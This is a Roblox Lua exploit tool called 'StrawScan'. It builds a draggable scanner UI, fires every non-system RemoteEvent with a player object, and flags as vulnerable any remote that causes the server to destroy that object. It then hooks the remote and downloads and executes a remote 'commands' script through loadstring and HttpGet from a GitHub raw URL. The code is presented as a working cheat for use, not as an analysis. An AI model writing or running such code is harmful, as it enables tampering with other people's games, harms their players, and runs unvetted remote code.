-- Scripts
local UIDragScript = Instance.new("LocalScript")
UIDragScript.Name = "UIDrag"
UIDragScript.Parent = Scanner

local FunctionScript = Instance.new("LocalScript")
FunctionScript.Name = "Function"
FunctionScript.Parent = ScanBtn

local StrawScanScript = Instance.new("LocalScript")
StrawScanScript.Name = "StrawScan"
StrawScanScript.Parent = Scanner

-- UI Drag Script
local function setupUIDrag()
    local frame = UIDragScript.Parent
    local dragToggle = nil
    local dragSpeed = 0.25
    local dragStart = nil
    local startPos = nil
    
    local function updateInput(input)
        local delta = input.Position - dragStart
        local position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
        TweenService:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
    end
    
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragToggle = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragToggle = false
                end
            end)
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            if dragToggle then
                updateInput(input)
            end
        end
    end)
end

-- Button Function Script
local function setupButtonFunction()
    local Button = FunctionScript.Parent
    local Info = TweenInfo.new(0.15, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
    local CanClick = true
    
    Button.MouseEnter:Connect(function()
        if not CanClick then return end
        TweenService:Create(Button.Glass, Info, {BackgroundTransparency = 0.25}):Play()
    end)
    
    Button.MouseLeave:Connect(function()
        if not CanClick then return end
        TweenService:Create(Button.Glass, Info, {BackgroundTransparency = 1}):Play()
    end)
    
    Button.MouseButton1Click:Connect(function()
        if not CanClick then return end
        CanClick = false
        TweenService:Create(Button.Glass, Info, {BackgroundTransparency = 0.25}):Play()
    end)
end

-- StrawScan Script
local function setupStrawScan()
    --[[
    StrawScan - Advanced remote event scanner
    Last updated: 9/15/2025
    
    Scans for vulnerable RemoteEvents in the game
    ]]
    
    local ScanButton = StrawScanScript.Parent.ScanBtn
    local AlreadyScanned = false
    local MaxScanTime = 0.25 -- Timeout for remote response
    local CurrentVulnerableRemote = nil
    
    local LocalPlayer = Players.LocalPlayer
    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    
    -- Check if object is destroyed
    local function isDestroyed(obj)
        return not obj:IsDescendantOf(game)
    end
    
    -- Test if a remote event is vulnerable
    local function isVulnerable(rmevent)
        -- Get test object (StarterGear or Character Head)
        local TestPart = LocalPlayer:FindFirstChild("StarterGear")
        if not TestPart then
            warn("StrawScan // StarterGear not found, replacing with char head")
            TestPart = Character:FindFirstChild("Head")
        end
        
        if not TestPart then
            error("StrawScan // TestPart could not be found!")
            return false
        end
        
        -- Fire remote and check response
        rmevent:FireServer(TestPart)
        
        local t = tick()
        while tick() - t < MaxScanTime do
            if isDestroyed(TestPart) then
                print("StrawScan // Vulnerable remote found!: " .. rmevent:GetFullName())
                CurrentVulnerableRemote = rmevent
                return true
            end
            task.wait()
        end
        
        print("StrawScan // Remote not vulnerable: " .. rmevent:GetFullName())
        return false
    end
    
    -- Scan button click handler
    ScanButton.MouseButton1Click:Connect(function()
        if AlreadyScanned then return end
        AlreadyScanned = true
        
        local Remotes = {}
        local FoundRemote = false
        
        -- Collect all RemoteEvents except Roblox system ones
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("RemoteEvent") then
                if v.Parent and (v.Parent.Name == "RobloxReplicatedStorage" or v.Parent.Name == "DefaultChatSystemChatEvents") then
                    continue 
                end
                
                FoundRemote = true
                table.insert(Remotes, v)
            end
        end
        
        if not FoundRemote then
            ScanButton.TextSize = 12
            ScanButton.Text = "Sorry, no vuln remotes"
            return
        end
        
        -- Update UI with scan progress
        ScanButton.Text = "Scanning... (0/" .. tostring(#Remotes) .. ")"
        
        -- Scan each remote
        for i, v in pairs(Remotes) do
            ScanButton.Text = "Scanning... (" .. tostring(i) .. "/" .. tostring(#Remotes) .. ")"
            
            if isVulnerable(v) then
                ScanButton.TextSize = 12
                ScanButton.Text = "Vuln found, booting up"
                
                task.wait(0.1)
                
                -- Create reference to vulnerable remote
                local VulnRemote = Instance.new("ObjectValue")
                VulnRemote.Parent = LocalPlayer.PlayerGui
                VulnRemote.Name = "StrawberryHookedRM"
                VulnRemote.Value = CurrentVulnerableRemote
                
                -- Load commands script
                loadstring(game:HttpGet("https://raw.githubusercontent.com/StrawberryRBLX/Strawberry-Scanner/refs/heads/main/release/commands.lua"))()
                
                task.wait(1)
                StrawScanScript.Parent.Parent:Destroy() -- Remove scanner UI
                break
            end
        end
        
        if not CurrentVulnerableRemote then
            ScanButton.TextSize = 12
            ScanButton.Text = "Sorry, no vuln remotes"
        end
    end)
end

-- Initialize scripts
setupUIDrag()
setupButtonFunction()
setupStrawScan()
